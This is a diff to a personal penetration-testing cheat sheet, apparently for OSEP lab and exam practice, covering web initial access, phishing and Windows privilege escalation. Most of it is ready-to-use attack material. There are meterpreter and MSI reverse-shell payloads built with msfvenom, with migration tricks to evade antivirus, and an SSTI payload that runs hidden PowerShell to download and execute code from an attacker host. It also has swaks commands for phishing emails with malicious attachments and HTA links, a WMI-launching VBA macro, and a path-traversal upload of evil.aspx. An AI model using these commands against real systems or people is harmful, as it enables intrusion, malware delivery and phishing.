@@ -13,6 +13,8 @@
 	- Login pages for default creds
 	- Wordpress sites to be wpscan
 	- file upload pages to be tested
+	- If there are two or more webservices on the same host (especially if one is like 80 or 8080) and there is a fileupload vector, one should test for path traversal when uploading files. It might be that it is possible to gain file execution only via the port 80 service. 
+		- see if you can influence the upload path either by DIRECTLY CHANGING the NAME of the file (..\..\..\..\..\inetpub\wwwroot\evil.aspx) or burpsuite-ing it
 - DevOps stuff like gitlab, Ansible, Artifactory should be noted down as they will likely play a part further on
 - If there are fields for user input, please try SQL Injection, SSTI payloads. SQLMap can be very useful. For SSTI payloads, run the following:
 ```bash
@@ -39,14 +41,19 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=443 prpendmigr
 - x86 for MSWord vectors, x64 for everything else
 - Consider setting AutoRunScript in the advanced options of exploit/multi/handler to run a process migration upon establishing the meterpreter shell to evade AV
 - if it doesnt work, you may wish to use prepend migrate which is another form of migration but done earlier in the process of establishing the shell (might be more unstable but allegedly more evasive)
-```
+```bash
+# prepend migrate
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=443 EXITFUNC=Thread prpendmigrateprocess=explorer.exe prependmigrate=true -f ps1
+# in Meterpreter
 msf6 (exploit/multi/handler) > set AutoRunScript post/windows/manage/migrate
+#OR
+msf6 (exploit/multi/handler) > set prependmigrate true; set prependmigrateprocess explorer.exe
 ```
 
 ## Initial Access
 
 ### Web SSTI Vulnerability
-- if SSTI vulnerable, read this for more info (https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
+- if SSTI vulnerable, read this for more info (https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/) (https://www.schtech.co.uk/razor-pages-ssti-rce/)
 - test for command execution with
 ```csharp
 @{ 
@@ -57,10 +64,14 @@ msf6 (exploit/multi/handler) > set AutoRunScript post/windows/manage/migrate
   var output = proc.StandardOutput.ReadToEnd();
 }
 @output
+# ping check
+@(System.Diagnostics.Process.Start("ping.exe", "<kali ip>"))
+
 ```
 if the above works then powershell shellcode runner
 ```csharp
 @{ System.Diagnostics.Process.Start("cmd.exe", "/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.XX.XX/simplerunner64.txt')"); }
+# you may need to base64 it!
 ```
 
 ### SQL Vulnerability
@@ -89,12 +100,18 @@ http://192.168.X.X/login.asp?user=test&pass=1' or 1=1;EXEC sp_configure 'show ad
 ```
 - Note if there is SQL vuln, that means there is an SQL database somewhere (most likely MSSQL)
 
-
 ### Email Phishing Vector
 - Look out for hosts with smtp (Port 25 default) and see if there are any email addresses found
 - Use smtp-user-enum if unable to find email addresses
 - send email with swaks
+```bash
+# Send as Attachment
+sudo swaks -t target@domain.com --from hacker@hacker.com --server <host with port25> --body 'CV Attached' --header Anything --attach @<name of attachedfile>
 
+# Send malicious link
+sudo swaks -t target@domain.com --from hacker@hacker.com --server <host with port25> --body 'Click here http://<attacker ip>>/clickme.hta' --header Anything
+
+```
 
 ### MSDoc Phishing
 - Assuming you know that you need to set up the DocumentOpen and AutoOpen functions
@@ -123,6 +140,13 @@ Sub MyMacro()
 End Sub
 ```
 - if the above fails, likely powershell is restricted in some way or your meterpreter shell is caught (check for hits to your apache server)
+- Another way via WMI (do one by one, AMSI first and then the powershell)
+```vba
+Sub MyMacro()
+    strArg = "powershell -enc SQBFAFgAKA... "
+    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+```
 - Can consider a direct VBA Shellcode Runner (obfuscated shellcode) of course
 - if not, you can use get the VBA to download your compiled executable and execute it with InstalUtil
 
@@ -132,4 +156,30 @@ End Sub
 - Prependfork=true spawns a child process before executing the malcode which is stealthier and is more stable as the parent process wont crash or have malcode running in it
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
+```
+
+-----------------------------------------------------------------------------------------------
+## PrivEsc
+
+## Windows
+
+### SeImpersonatePrivilege
+
+- If you have meterpreter, just use GetSystem
+- If not, try SigmaPotato.exe. This doesnt get caught in OSEP Labs (though it will definitely get caught in modern systems)
+- If not, you can use an obfuscated PrintSpoofer
+
+### AlwaysInstallElevated
+
+- multiple ways to do this. Need to see which works
+**Via Meterpreter**
+```bash
+# remember to set a x64 payload or else this wont work
+use exploit/windows/local/always_install_elevated
+```
+**Via Msfvenom**
+- I cannot get this to work ever
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
+
 ```
